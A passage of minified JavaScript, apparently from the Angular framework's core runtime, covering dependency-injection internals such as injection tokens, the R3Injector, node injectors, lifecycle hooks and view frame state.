x0=Symbol("InputSignalNode#UNSET"),lP=ue(U({},gg),{transformFn:void 0,applyValueToInputSignal(n,e){_l(n,e)}});function R0(n,e){let t=Object.create(lP);t.value=n,t.transformFn=e?.transform;function r(){if(gl(t),t.value===x0)throw new Y(-950,!1);return t.value}return r[Qt]=t,r}function hc(n){return{toString:n}.toString()}var Wl="__parameters__";function dP(n){return function(...t){if(n){let r=n(...t);for(let i in r)this[i]=r[i]}}}function N0(n,e,t){return hc(()=>{let r=dP(e);function i(...o){if(this instanceof i)return r.apply(this,o),this;let s=new i(...o);return a.annotation=s,a;function a(c,l,h){let p=c.hasOwnProperty(Wl)?c[Wl]:Object.defineProperty(c,Wl,{value:[]})[Wl];for(;p.length<=h;)p.push(null);return(p[h]=p[h]||[]).push(s),c}}return t&&(i.prototype=Object.create(t.prototype)),i.prototype.ngMetadataName=n,i.annotationCls=i,i})}var Yt=globalThis;function Me(n){for(let e in n)if(n[e]===Me)return e;throw Error("Could not find renamed property on target object.")}function hP(n,e){for(let t in e)e.hasOwnProperty(t)&&!n.hasOwnProperty(t)&&(n[t]=e[t])}function Ht(n){if(typeof n=="string")return n;if(Array.isArray(n))return"["+n.map(Ht).join(", ")+"]";if(n==null)return""+n;if(n.overriddenName)return`${n.overriddenName}`;if(n.name)return`${n.name}`;let e=n.toString();if(e==null)return""+e;let t=e.indexOf(`
`);return t===-1?e:e.substring(0,t)}function qD(n,e){return n==null||n===""?e===null?"":e:e==null||e===""?n:n+" "+e}var fP=Me({__forward_ref__:Me});function Qi(n){return n.__forward_ref__=Qi,n.toString=function(){return Ht(this())},n}function Nt(n){return P0(n)?n():n}function P0(n){return typeof n=="function"&&n.hasOwnProperty(fP)&&n.__forward_ref__===Qi}function W(n){return{token:n.token,providedIn:n.providedIn||null,factory:n.factory,value:void 0}}function Ke(n){return{providers:n.providers||[],imports:n.imports||[]}}function xd(n){return zD(n,O0)||zD(n,F0)}function k0(n){return xd(n)!==null}function zD(n,e){return n.hasOwnProperty(e)?n[e]:null}function pP(n){let e=n&&(n[O0]||n[F0]);return e||null}function GD(n){return n&&(n.hasOwnProperty(WD)||n.hasOwnProperty(gP))?n[WD]:null}var O0=Me({\u0275prov:Me}),WD=Me({\u0275inj:Me}),F0=Me({ngInjectableDef:Me}),gP=Me({ngInjectorDef:Me}),j=class{_desc;ngMetadataName="InjectionToken";\u0275prov;constructor(e,t){this._desc=e,this.\u0275prov=void 0,typeof t=="number"?this.__NG_ELEMENT_ID__=t:t!==void 0&&(this.\u0275prov=W({token:this,providedIn:t.providedIn||"root",factory:t.factory}))}get multi(){return this}toString(){return`InjectionToken ${this._desc}`}};function V0(n){return n&&!!n.\u0275providers}var mP=Me({\u0275cmp:Me}),yP=Me({\u0275dir:Me}),vP=Me({\u0275pipe:Me}),_P=Me({\u0275mod:Me}),nd=Me({\u0275fac:Me}),rc=Me({__NG_ELEMENT_ID__:Me}),KD=Me({__NG_ENV_ID__:Me});function Pm(n){return typeof n=="string"?n:n==null?"":String(n)}function wP(n){return typeof n=="function"?n.name||n.toString():typeof n=="object"&&n!=null&&typeof n.type=="function"?n.type.name||n.type.toString():Pm(n)}function EP(n,e){let t=e?`. Dependency path: ${e.join(" > ")} > ${n}`:"";throw new Y(-200,n)}function km(n,e){throw new Y(-201,!1)}var le=function(n){return n[n.Default=0]="Default",n[n.Host=1]="Host",n[n.Self=2]="Self",n[n.SkipSelf=4]="SkipSelf",n[n.Optional=8]="Optional",n}(le||{}),Kg;function L0(){return Kg}function $t(n){let e=Kg;return Kg=n,e}function U0(n,e,t){let r=xd(n);if(r&&r.providedIn=="root")return r.value===void 0?r.value=r.factory():r.value;if(t&le.Optional)return null;if(e!==void 0)return e;km(n,"Injector")}var IP={},oc=IP,Qg="__NG_DI_FLAG__",rd="ngTempTokenPath",DP="ngTokenPath",CP=/\n/gm,bP="\u0275",QD="__source",Jo;function TP(){return Jo}function qr(n){let e=Jo;return Jo=n,e}function SP(n,e=le.Default){if(Jo===void 0)throw new Y(-203,!1);return Jo===null?U0(n,void 0,e):Jo.get(n,e&le.Optional?null:void 0,e)}function L(n,e=le.Default){return(L0()||SP)(Nt(n),e)}function V(n,e=le.Default){return L(n,Rd(e))}function Rd(n){return typeof n>"u"||typeof n=="number"?n:0|(n.optional&&8)|(n.host&&1)|(n.self&&2)|(n.skipSelf&&4)}function Yg(n){let e=[];for(let t=0;t<n.length;t++){let r=Nt(n[t]);if(Array.isArray(r)){if(r.length===0)throw new Y(900,!1);let i,o=le.Default;for(let s=0;s<r.length;s++){let a=r[s],c=AP(a);typeof c=="number"?c===-1?i=a.token:o|=c:i=a}e.push(L(i,o))}else e.push(L(r))}return e}function j0(n,e){return n[Qg]=e,n.prototype[Qg]=e,n}function AP(n){return n[Qg]}function MP(n,e,t,r){let i=n[rd];throw e[QD]&&i.unshift(e[QD]),n.message=xP(`
`+n.message,i,t,r),n[DP]=i,n[rd]=null,n}function xP(n,e,t,r=null){n=n&&n.charAt(0)===`
`&&n.charAt(1)==bP?n.slice(2):n;let i=Ht(e);if(Array.isArray(e))i=e.map(Ht).join(" -> ");else if(typeof e=="object"){let o=[];for(let s in e)if(e.hasOwnProperty(s)){let a=e[s];o.push(s+":"+(typeof a=="string"?JSON.stringify(a):Ht(a)))}i=`{${o.join(", ")}}`}return`${t}${r?"("+r+")":""}[${i}]: ${n.replace(CP,`
  `)}`}var fc=j0(N0("Optional"),8);var B0=j0(N0("SkipSelf"),4);function Hi(n,e){let t=n.hasOwnProperty(nd);return t?n[nd]:null}function Om(n,e){n.forEach(t=>Array.isArray(t)?Om(t,e):e(t))}function $0(n,e,t){e>=n.length?n.push(t):n.splice(e,0,t)}function id(n,e){return e>=n.length-1?n.pop():n.splice(e,1)[0]}function RP(n,e,t,r){let i=n.length;if(i==e)n.push(t,r);else if(i===1)n.push(r,n[0]),n[0]=t;else{for(i--,n.push(n[i-1],n[i]);i>e;){let o=i-2;n[i]=n[o],i--}n[e]=t,n[e+1]=r}}function NP(n,e,t){let r=pc(n,e);return r>=0?n[r|1]=t:(r=~r,RP(n,r,e,t)),r}function Og(n,e){let t=pc(n,e);if(t>=0)return n[t|1]}function pc(n,e){return PP(n,e,1)}function PP(n,e,t){let r=0,i=n.length>>t;for(;i!==r;){let o=r+(i-r>>1),s=n[o<<t];if(e===s)return o<<t;s>e?i=o:r=o+1}return~(i<<t)}var es={},cn=[],ts=new j(""),H0=new j("",-1),q0=new j(""),od=class{get(e,t=oc){if(t===oc){let r=new Error(`NullInjectorError: No provider for ${Ht(e)}!`);throw r.name="NullInjectorError",r}return t}};function z0(n,e){let t=n[_P]||null;if(!t&&e===!0)throw new Error(`Type ${Ht(n)} does not have '\u0275mod' property.`);return t}function Wr(n){return n[mP]||null}function G0(n){return n[yP]||null}function W0(n){return n[vP]||null}function K0(n){let e=Wr(n)||G0(n)||W0(n);return e!==null?e.standalone:!1}function Nd(n){return{\u0275providers:n}}function kP(...n){return{\u0275providers:Q0(!0,n),\u0275fromNgModule:!0}}function Q0(n,...e){let t=[],r=new Set,i,o=s=>{t.push(s)};return Om(e,s=>{let a=s;Zg(a,o,[],r)&&(i||=[],i.push(a))}),i!==void 0&&Y0(i,o),t}function Y0(n,e){for(let t=0;t<n.length;t++){let{ngModule:r,providers:i}=n[t];Fm(i,o=>{e(o,r)})}}function Zg(n,e,t,r){if(n=Nt(n),!n)return!1;let i=null,o=GD(n),s=!o&&Wr(n);if(!o&&!s){let c=n.ngModule;if(o=GD(c),o)i=c;else return!1}else{if(s&&!s.standalone)return!1;i=n}let a=r.has(i);if(s){if(a)return!1;if(r.add(i),s.dependencies){let c=typeof s.dependencies=="function"?s.dependencies():s.dependencies;for(let l of c)Zg(l,e,t,r)}}else if(o){if(o.imports!=null&&!a){r.add(i);let l;try{Om(o.imports,h=>{Zg(h,e,t,r)&&(l||=[],l.push(h))})}finally{}l!==void 0&&Y0(l,e)}if(!a){let l=Hi(i)||(()=>new i);e({provide:i,useFactory:l,deps:cn},i),e({provide:q0,useValue:i,multi:!0},i),e({provide:ts,useValue:()=>L(i),multi:!0},i)}let c=o.providers;if(c!=null&&!a){let l=n;Fm(c,h=>{e(h,l)})}}else return!1;return i!==n&&n.providers!==void 0}function Fm(n,e){for(let t of n)V0(t)&&(t=t.\u0275providers),Array.isArray(t)?Fm(t,e):e(t)}var OP=Me({provide:String,useValue:Me});function Z0(n){return n!==null&&typeof n=="object"&&OP in n}function FP(n){return!!(n&&n.useExisting)}function VP(n){return!!(n&&n.useFactory)}function ns(n){return typeof n=="function"}function LP(n){return!!n.useClass}var Pd=new j(""),Jl={},UP={},Fg;function Vm(){return Fg===void 0&&(Fg=new od),Fg}var Pt=class{},sc=class extends Pt{parent;source;scopes;records=new Map;_ngOnDestroyHooks=new Set;_onDestroyHooks=[];get destroyed(){return this._destroyed}_destroyed=!1;injectorDefTypes;constructor(e,t,r,i){super(),this.parent=t,this.source=r,this.scopes=i,Xg(e,s=>this.processProvider(s)),this.records.set(H0,Ko(void 0,this)),i.has("environment")&&this.records.set(Pt,Ko(void 0,this));let o=this.records.get(Pd);o!=null&&typeof o.value=="string"&&this.scopes.add(o.value),this.injectorDefTypes=new Set(this.get(q0,cn,le.Self))}destroy(){tc(this),this._destroyed=!0;let e=De(null);try{for(let r of this._ngOnDestroyHooks)r.ngOnDestroy();let t=this._onDestroyHooks;this._onDestroyHooks=[];for(let r of t)r()}finally{this.records.clear(),this._ngOnDestroyHooks.clear(),this.injectorDefTypes.clear(),De(e)}}onDestroy(e){return tc(this),this._onDestroyHooks.push(e),()=>this.removeOnDestroy(e)}runInContext(e){tc(this);let t=qr(this),r=$t(void 0),i;try{return e()}finally{qr(t),$t(r)}}get(e,t=oc,r=le.Default){if(tc(this),e.hasOwnProperty(KD))return e[KD](this);r=Rd(r);let i,o=qr(this),s=$t(void 0);try{if(!(r&le.SkipSelf)){let c=this.records.get(e);if(c===void 0){let l=qP(e)&&xd(e);l&&this.injectableDefInScope(l)?c=Ko(Jg(e),Jl):c=null,this.records.set(e,c)}if(c!=null)return this.hydrate(e,c)}let a=r&le.Self?Vm():this.parent;return t=r&le.Optional&&t===oc?null:t,a.get(e,t)}catch(a){if(a.name==="NullInjectorError"){if((a[rd]=a[rd]||[]).unshift(Ht(e)),o)throw a;return MP(a,e,"R3InjectorError",this.source)}else throw a}finally{$t(s),qr(o)}}resolveInjectorInitializers(){let e=De(null),t=qr(this),r=$t(void 0),i;try{let o=this.get(ts,cn,le.Self);for(let s of o)s()}finally{qr(t),$t(r),De(e)}}toString(){let e=[],t=this.records;for(let r of t.keys())e.push(Ht(r));return`R3Injector[${e.join(", ")}]`}processProvider(e){e=Nt(e);let t=ns(e)?e:Nt(e&&e.provide),r=BP(e);if(!ns(e)&&e.multi===!0){let i=this.records.get(t);i||(i=Ko(void 0,Jl,!0),i.factory=()=>Yg(i.multi),this.records.set(t,i)),t=e,i.multi.push(e)}this.records.set(t,r)}hydrate(e,t){let r=De(null);try{return t.value===Jl&&(t.value=UP,t.value=t.factory()),typeof t.value=="object"&&t.value&&HP(t.value)&&this._ngOnDestroyHooks.add(t.value),t.value}finally{De(r)}}injectableDefInScope(e){if(!e.providedIn)return!1;let t=Nt(e.providedIn);return typeof t=="string"?t==="any"||this.scopes.has(t):this.injectorDefTypes.has(t)}removeOnDestroy(e){let t=this._onDestroyHooks.indexOf(e);t!==-1&&this._onDestroyHooks.splice(t,1)}};function Jg(n){let e=xd(n),t=e!==null?e.factory:Hi(n);if(t!==null)return t;if(n instanceof j)throw new Y(204,!1);if(n instanceof Function)return jP(n);throw new Y(204,!1)}function jP(n){if(n.length>0)throw new Y(204,!1);let t=pP(n);return t!==null?()=>t.factory(n):()=>new n}function BP(n){if(Z0(n))return Ko(void 0,n.useValue);{let e=J0(n);return Ko(e,Jl)}}function J0(n,e,t){let r;if(ns(n)){let i=Nt(n);return Hi(i)||Jg(i)}else if(Z0(n))r=()=>Nt(n.useValue);else if(VP(n))r=()=>n.useFactory(...Yg(n.deps||[]));else if(FP(n))r=()=>L(Nt(n.useExisting));else{let i=Nt(n&&(n.useClass||n.provide));if($P(n))r=()=>new i(...Yg(n.deps));else return Hi(i)||Jg(i)}return r}function tc(n){if(n.destroyed)throw new Y(205,!1)}function Ko(n,e,t=!1){return{factory:n,value:e,multi:t?[]:void 0}}function $P(n){return!!n.deps}function HP(n){return n!==null&&typeof n=="object"&&typeof n.ngOnDestroy=="function"}function qP(n){return typeof n=="function"||typeof n=="object"&&n instanceof j}function Xg(n,e){for(let t of n)Array.isArray(t)?Xg(t,e):t&&V0(t)?Xg(t.\u0275providers,e):e(t)}function qt(n,e){n instanceof sc&&tc(n);let t,r=qr(n),i=$t(void 0);try{return e()}finally{qr(r),$t(i)}}function X0(){return L0()!==void 0||TP()!=null}function zP(n){if(!X0())throw new Y(-203,!1)}function GP(n){let e=Yt.ng;if(e&&e.\u0275compilerFacade)return e.\u0275compilerFacade;throw new Error("JIT compiler unavailable")}function WP(n){return typeof n=="function"}var hr=0,fe=1,te=2,kt=3,In=4,Dn=5,sd=6,ad=7,ar=8,rs=9,Kr=10,mt=11,ac=12,YD=13,gc=14,Ln=15,cc=16,Qo=17,kd=18,Od=19,eC=20,zr=21,Vg=22,cd=23,Zt=24,cr=25,tC=1;var qi=7,ud=8,ld=9,un=10,dd=function(n){return n[n.None=0]="None",n[n.HasTransplantedViews=2]="HasTransplantedViews",n}(dd||{});function Gr(n){return Array.isArray(n)&&typeof n[tC]=="object"}function fr(n){return Array.isArray(n)&&n[tC]===!0}function nC(n){return(n.flags&4)!==0}function Fd(n){return n.componentOffset>-1}function rC(n){return(n.flags&1)===1}function Qr(n){return!!n.template}function em(n){return(n[te]&512)!==0}var tm=class{previousValue;currentValue;firstChange;constructor(e,t,r){this.previousValue=e,this.currentValue=t,this.firstChange=r}isFirstChange(){return this.firstChange}};function iC(n,e,t,r){e!==null?e.applyValueToInputSignal(e,r):n[t]=r}var hs=(()=>{let n=()=>oC;return n.ngInherit=!0,n})();function oC(n){return n.type.prototype.ngOnChanges&&(n.setInput=QP),KP}function KP(){let n=aC(this),e=n?.current;if(e){let t=n.previous;if(t===es)n.previous=e;else for(let r in e)t[r]=e[r];n.current=null,this.ngOnChanges(e)}}function QP(n,e,t,r,i){let o=this.declaredInputs[r],s=aC(n)||YP(n,{previous:es,current:null}),a=s.current||(s.current={}),c=s.previous,l=c[o];a[o]=new tm(l&&l.currentValue,t,c===es),iC(n,e,i,t)}var sC="__ngSimpleChanges__";function aC(n){return n[sC]||null}function YP(n,e){return n[sC]=e}var ZD=null;var Fn=function(n,e,t){ZD?.(n,e,t)},ZP="svg",JP="math";function Un(n){for(;Array.isArray(n);)n=n[hr];return n}function cC(n,e){return Un(e[n])}function ln(n,e){return Un(e[n.index])}function uC(n,e){return n.data[e]}function XP(n,e){return n[e]}function Jr(n,e){let t=e[n];return Gr(t)?t:t[hr]}function Lm(n){return(n[te]&128)===128}function e1(n){return fr(n[kt])}function JD(n,e){return e==null?null:n[e]}function lC(n){n[Qo]=0}function Um(n){n[te]&1024||(n[te]|=1024,Lm(n)&&Ld(n))}function Vd(n){return!!(n[te]&9216||n[Zt]?.dirty)}function nm(n){n[Kr].changeDetectionScheduler?.notify(9),n[te]&64&&(n[te]|=1024),Vd(n)&&Ld(n)}function Ld(n){n[Kr].changeDetectionScheduler?.notify(0);let e=zi(n);for(;e!==null&&!(e[te]&8192||(e[te]|=8192,!Lm(e)));)e=zi(e)}function dC(n,e){if((n[te]&256)===256)throw new Y(911,!1);n[zr]===null&&(n[zr]=[]),n[zr].push(e)}function t1(n,e){if(n[zr]===null)return;let t=n[zr].indexOf(e);t!==-1&&n[zr].splice(t,1)}function zi(n){let e=n[kt];return fr(e)?e[kt]:e}var _e={lFrame:_C(null),bindingsEnabled:!0,skipHydrationRootTNode:null};var rm=!1;function n1(){return _e.lFrame.elementDepthCount}function r1(){_e.lFrame.elementDepthCount++}function i1(){_e.lFrame.elementDepthCount--}function hC(){return _e.bindingsEnabled}function o1(){return _e.skipHydrationRootTNode!==null}function s1(n){return _e.skipHydrationRootTNode===n}function a1(){_e.skipHydrationRootTNode=null}function Ge(){return _e.lFrame.lView}function dn(){return _e.lFrame.tView}function Xt(){let n=fC();for(;n!==null&&n.type===64;)n=n.parent;return n}function fC(){return _e.lFrame.currentTNode}function c1(){let n=_e.lFrame,e=n.currentTNode;return n.isParent?e:e.parent}function Ud(n,e){let t=_e.lFrame;t.currentTNode=n,t.isParent=e}function pC(){return _e.lFrame.isParent}function u1(){_e.lFrame.isParent=!1}function gC(){return rm}function XD(n){let e=rm;return rm=n,e}function l1(){let n=_e.lFrame,e=n.bindingRootIndex;return e===-1&&(e=n.bindingRootIndex=n.tView.bindingStartIndex),e}function d1(n){return _e.lFrame.bindingIndex=n}function jm(){return _e.lFrame.bindingIndex++}function h1(n){let e=_e.lFrame,t=e.bindingIndex;return e.bindingIndex=e.bindingIndex+n,t}function f1(){return _e.lFrame.inI18n}function p1(n,e){let t=_e.lFrame;t.bindingIndex=t.bindingRootIndex=n,im(e)}function g1(){return _e.lFrame.currentDirectiveIndex}function im(n){_e.lFrame.currentDirectiveIndex=n}function m1(n){let e=_e.lFrame.currentDirectiveIndex;return e===-1?null:n[e]}function mC(n){_e.lFrame.currentQueryIndex=n}function y1(n){let e=n[fe];return e.type===2?e.declTNode:e.type===1?n[Dn]:null}function yC(n,e,t){if(t&le.SkipSelf){let i=e,o=n;for(;i=i.parent,i===null&&!(t&le.Host);)if(i=y1(o),i===null||(o=o[gc],i.type&10))break;if(i===null)return!1;e=i,n=o}let r=_e.lFrame=vC();return r.currentTNode=e,r.lView=n,!0}function Bm(n){let e=vC(),t=n[fe];_e.lFrame=e,e.currentTNode=t.firstChild,e.lView=n,e.tView=t,e.contextLView=n,e.bindingIndex=t.bindingStartIndex,e.inI18n=!1}function vC(){let n=_e.lFrame,e=n===null?null:n.child;return e===null?_C(n):e}function _C(n){let e={currentTNode:null,isParent:!0,lView:null,tView:null,selectedIndex:-1,contextLView:null,elementDepthCount:0,currentNamespace:null,currentDirectiveIndex:-1,bindingRootIndex:-1,bindingIndex:-1,currentQueryIndex:0,parent:n,child:null,inI18n:!1};return n!==null&&(n.child=e),e}function wC(){let n=_e.lFrame;return _e.lFrame=n.parent,n.currentTNode=null,n.lView=null,n}var EC=wC;function $m(){let n=wC();n.isParent=!0,n.tView=null,n.selectedIndex=-1,n.contextLView=null,n.elementDepthCount=0,n.currentDirectiveIndex=-1,n.currentNamespace=null,n.bindingRootIndex=-1,n.bindingIndex=-1,n.currentQueryIndex=0}function fs(){return _e.lFrame.selectedIndex}function Gi(n){_e.lFrame.selectedIndex=n}function IC(){let n=_e.lFrame;return uC(n.tView,n.selectedIndex)}function v1(){return _e.lFrame.currentNamespace}var DC=!0;function CC(){return DC}function bC(n){DC=n}function _1(n,e,t){let{ngOnChanges:r,ngOnInit:i,ngDoCheck:o}=e.type.prototype;if(r){let s=oC(e);(t.preOrderHooks??=[]).push(n,s),(t.preOrderCheckHooks??=[]).push(n,s)}i&&(t.preOrderHooks??=[]).push(0-n,i),o&&((t.preOrderHooks??=[]).push(n,o),(t.preOrderCheckHooks??=[]).push(n,o))}function TC(n,e){for(let t=e.directiveStart,r=e.directiveEnd;t<r;t++){let o=n.data[t].type.prototype,{ngAfterContentInit:s,ngAfterContentChecked:a,ngAfterViewInit:c,ngAfterViewChecked:l,ngOnDestroy:h}=o;s&&(n.contentHooks??=[]).push(-t,s),a&&((n.contentHooks??=[]).push(t,a),(n.contentCheckHooks??=[]).push(t,a)),c&&(n.viewHooks??=[]).push(-t,c),l&&((n.viewHooks??=[]).push(t,l),(n.viewCheckHooks??=[]).push(t,l)),h!=null&&(n.destroyHooks??=[]).push(t,h)}}function Xl(n,e,t){SC(n,e,3,t)}function ed(n,e,t,r){(n[te]&3)===t&&SC(n,e,t,r)}function Lg(n,e){let t=n[te];(t&3)===e&&(t&=16383,t+=1,n[te]=t)}function SC(n,e,t,r){let i=r!==void 0?n[Qo]&65535:0,o=r??-1,s=e.length-1,a=0;for(let c=i;c<s;c++)if(typeof e[c+1]=="number"){if(a=e[c],r!=null&&a>=r)break}else e[c]<0&&(n[Qo]+=65536),(a<o||o==-1)&&(w1(n,t,e,c),n[Qo]=(n[Qo]&4294901760)+c+2),c++}function e0(n,e){Fn(4,n,e);let t=De(null);try{e.call(n)}finally{De(t),Fn(5,n,e)}}function w1(n,e,t,r){let i=t[r]<0,o=t[r+1],s=i?-t[r]:t[r],a=n[s];i?n[te]>>14<n[Qo]>>16&&(n[te]&3)===e&&(n[te]+=16384,e0(a,o)):e0(a,o)}var Xo=-1,Wi=class{factory;injectImpl;resolving=!1;canSeeViewProviders;multi;componentProviders;index;providerFactory;constructor(e,t,r){this.factory=e,this.canSeeViewProviders=t,this.injectImpl=r}};function E1(n){return n instanceof Wi}function I1(n){return(n.flags&8)!==0}function D1(n){return(n.flags&16)!==0}function om(n,e,t){let r=0;for(;r<t.length;){let i=t[r];if(typeof i=="number"){if(i!==0)break;r++;let o=t[r++],s=t[r++],a=t[r++];n.setAttribute(e,s,a,o)}else{let o=i,s=t[++r];b1(o)?n.setProperty(e,o,s):n.setAttribute(e,o,s),r++}}return r}function C1(n){return n===3||n===4||n===6}function b1(n){return n.charCodeAt(0)===64}function uc(n,e){if(!(e===null||e.length===0))if(n===null||n.length===0)n=e.slice();else{let t=-1;for(let r=0;r<e.length;r++){let i=e[r];typeof i=="number"?t=i:t===0||(t===-1||t===2?t0(n,t,i,null,e[++r]):t0(n,t,i,null,null))}}return n}function t0(n,e,t,r,i){let o=0,s=n.length;if(e===-1)s=-1;else for(;o<n.length;){let a=n[o++];if(typeof a=="number"){if(a===e){s=-1;break}else if(a>e){s=o-1;break}}}for(;o<n.length;){let a=n[o];if(typeof a=="number")break;if(a===t){if(r===null){i!==null&&(n[o+1]=i);return}else if(r===n[o+1]){n[o+2]=i;return}}o++,r!==null&&o++,i!==null&&o++}s!==-1&&(n.splice(s,0,e),o=s+1),n.splice(o++,0,t),r!==null&&n.splice(o++,0,r),i!==null&&n.splice(o++,0,i)}var Ug={},sm=class{injector;parentInjector;constructor(e,t){this.injector=e,this.parentInjector=t}get(e,t,r){r=Rd(r);let i=this.injector.get(e,Ug,r);return i!==Ug||t===Ug?i:this.parentInjector.get(e,t,r)}};function AC(n){return n!==Xo}function hd(n){return n&32767}function T1(n){return n>>16}function fd(n,e){let t=T1(n),r=e;for(;t>0;)r=r[gc],t--;return r}var am=!0;function pd(n){let e=am;return am=n,e}var S1=256,MC=S1-1,xC=5,A1=0,Vn={};function M1(n,e,t){let r;typeof t=="string"?r=t.charCodeAt(0)||0:t.hasOwnProperty(rc)&&(r=t[rc]),r==null&&(r=t[rc]=A1++);let i=r&MC,o=1<<i;e.data[n+(i>>xC)]|=o}function gd(n,e){let t=RC(n,e);if(t!==-1)return t;let r=e[fe];r.firstCreatePass&&(n.injectorIndex=e.length,jg(r.data,n),jg(e,null),jg(r.blueprint,null));let i=Hm(n,e),o=n.injectorIndex;if(AC(i)){let s=hd(i),a=fd(i,e),c=a[fe].data;for(let l=0;l<8;l++)e[o+l]=a[s+l]|c[s+l]}return e[o+8]=i,o}function jg(n,e){n.push(0,0,0,0,0,0,0,0,e)}function RC(n,e){return n.injectorIndex===-1||n.parent&&n.parent.injectorIndex===n.injectorIndex||e[n.injectorIndex+8]===null?-1:n.injectorIndex}function Hm(n,e){if(n.parent&&n.parent.injectorIndex!==-1)return n.parent.injectorIndex;let t=0,r=null,i=e;for(;i!==null;){if(r=FC(i),r===null)return Xo;if(t++,i=i[gc],r.injectorIndex!==-1)return r.injectorIndex|t<<16}return Xo}function cm(n,e,t){M1(n,e,t)}function NC(n,e,t){if(t&le.Optional||n!==void 0)return n;km(e,"NodeInjector")}function PC(n,e,t,r){if(t&le.Optional&&r===void 0&&(r=null),!(t&(le.Self|le.Host))){let i=n[rs],o=$t(void 0);try{return i?i.get(e,r,t&le.Optional):U0(e,r,t&le.Optional)}finally{$t(o)}}return NC(r,e,t)}function kC(n,e,t,r=le.Default,i){if(n!==null){if(e[te]&2048&&!(r&le.Self)){let s=k1(n,e,t,r,Vn);if(s!==Vn)return s}let o=OC(n,e,t,r,Vn);if(o!==Vn)return o}return PC(e,t,r,i)}function OC(n,e,t,r,i){let o=N1(t);if(typeof o=="function"){if(!yC(e,n,r))return r&le.Host?NC(i,t,r):PC(e,t,r,i);try{let s;if(s=o(r),s==null&&!(r&le.Optional))km(t);else return s}finally{EC()}}else if(typeof o=="number"){let s=null,a=RC(n,e),c=Xo,l=r&le.Host?e[Ln][Dn]:null;for((a===-1||r&le.SkipSelf)&&(c=a===-1?Hm(n,e):e[a+8],c===Xo||!r0(r,!1)?a=-1:(s=e[fe],a=hd(c),e=fd(c,e)));a!==-1;){let h=e[fe];if(n0(o,a,h.data)){let p=x1(a,e,t,s,r,l);if(p!==Vn)return p}c=e[a+8],c!==Xo&&r0(r,e[fe].data[a+8]===l)&&n0(o,a,e)?(s=h,a=hd(c),e=fd(c,e)):a=-1}}return i}function x1(n,e,t,r,i,o){let s=e[fe],a=s.data[n+8],c=r==null?Fd(a)&&am:r!=s&&(a.type&3)!==0,l=i&le.Host&&o===a,h=R1(a,s,t,c,l);return h!==null?is(e,s,h,a):Vn}function R1(n,e,t,r,i){let o=n.providerIndexes,s=e.data,a=o&1048575,c=n.directiveStart,l=n.directiveEnd,h=o>>20,p=r?a:a+h,m=i?a+h:l;for(let y=p;y<m;y++){let D=s[y];if(y<c&&t===D||y>=c&&D.type===t)return y}if(i){let y=s[c];if(y&&Qr(y)&&y.type===t)return c}return null}function is(n,e,t,r){let i=n[t],o=e.data;if(E1(i)){let s=i;s.resolving&&EP(wP(o[t]));let a=pd(s.canSeeViewProviders);s.resolving=!0;let c,l=s.injectImpl?$t(s.injectImpl):null,h=yC(n,r,le.Default);try{i=n[t]=s.factory(void 0,o,n,r),e.firstCreatePass&&t>=r.directiveStart&&_1(t,o[t],e)}finally{l!==null&&$t(l),pd(a),s.resolving=!1,EC()}}return i}function N1(n){if(typeof n=="string")return n.charCodeAt(0)||0;let e=n.hasOwnProperty(rc)?n[rc]:void 0;return typeof e=="number"?e>=0?e&MC:P1:e}function n0(n,e,t){let r=1<<n;return!!(t[e+(n>>xC)]&r)}function r0(n,e){return!(n&le.Self)&&!(n&le.Host&&e)}var $i=class{_tNode;_lView;constructor(e,t){this._tNode=e,this._lView=t}get(e,t,r){return kC(this._tNode,this._lView,e,Rd(r),t)}};function P1(){return new $i(Xt(),Ge())}function ps(n){return hc(()=>{let e=n.prototype.constructor,t=e[nd]||um(e),r=Object.prototype,i=Object.getPrototypeOf(n.prototype).constructor;for(;i&&i!==r;){let o=i[nd]||um(i);if(o&&o!==t)return o;i=Object.getPrototypeOf(i)}return o=>new o})}function um(n){return P0(n)?()=>{let e=um(Nt(n));return e&&e()}:Hi(n)}function k1(n,e,t,r,i){let o=n,s=e;for(;o!==null&&s!==null&&s[te]&2048&&!(s[te]&512);){let a=OC(o,s,t,r|le.Self,Vn);if(a!==Vn)return a;let c=o.parent;if(!c){let l=s[eC];if(l){let h=l.get(t,Vn,r);if(h!==Vn)return h}c=FC(s),s=s[gc]}o=c}return i}function FC(n){let e=n[fe],t=e.type;return t===2?e.declTNode:t===1?n[Dn]:null}function i0(n,e=null,t=null,r){let i=VC(n,e,t,r);return i.resolveInjectorInitializers(),i}function VC(n,e=null,t=null,r,i=new Set){let o=[t||cn,kP(n)];return r=r||(typeof n=="object"?void 0:Ht(n)),new sc(o,e||Vm(),r||null,i)}var Jt=class n{static THROW_IF_NOT_FOUND=oc;static NULL=new od;static create(e,t){if(Array.isArray(e))return i0({name:""},t,e,"");{let r=e.name??"";return i0({name:r},e.parent,e.providers,r)}}static \u0275prov=W({token:n,providedIn:"any",factory:()=>L(H0)});static __NG_ELEMENT_ID__=-1};var O1=new j("");O1.__NG_ELEMENT_ID__=n=>{let e=Xt();if(e===null)throw new Y(204,!1);if(e.type&2)return e.value;if(n&le.Optional)return null;throw new Y(204,!1)};var LC=!1,qm=(()=>{class n{static __NG_ELEMENT_ID__=F1;static __NG_ENV_ID__=t=>t}return n})(),lm=class extends qm{_lView;constructor(e){super(),this._lView=e}onDestroy(e){return dC(this._lView,e),()=>t1(this._lView,e)}};function F1(){return new lm(Ge())}var os=class{},zm=new j("",{providedIn:"root",factory:()=>!1});var UC=new j(""),jC=new j(""),pr=(()=>{class n{taskId=0;pendingTasks=new Set;get _hasPendingTasks(){return this.hasPendingTasks.value}hasPendingTasks=new gt(!1);add(){this._hasPendingTasks||this.hasPendingTasks.next(!0);let t=this.taskId++;return this.pendingTasks.add(t),t}has(t){return this.pendingTasks.has(t)}remove(t){this.pendingTasks.delete(t),this.pendingTasks.size===0&&this._hasPendingTasks&&this.hasPendingTasks.next(!1)}ngOnDestroy(){this.pendingTasks.clear(),this._hasPendingTasks&&this.hasPendingTasks.next(!1)}static \u0275prov=W({token:n,providedIn:"root",factory:()=>new n})}return n})();var dm=class extends Ve{__isAsync;destroyRef=void 0;pendingTasks=void 0;constructor(e=!1){super(),this.__isAsync=e,X0()&&(this.destroyRef=V(qm,{optional:!0})??void 0,this.pendingTasks=V(pr,{optional:!0})??void 0)}emit(e){let t=De(null);try{super.next(e)}finally{De(t)}}subscribe(e,t,r){let i=e,o=t||(()=>null),s=r;if(e&&typeof e=="object"){let c=e;i=c.next?.bind(c),o=c.error?.bind(c),s=c.complete?.bind(c)}this.__isAsync&&(o=this.wrapInTimeout(o),i&&(i=this.wrapInTimeout(i)),s&&(s=this.wrapInTimeout(s)));let 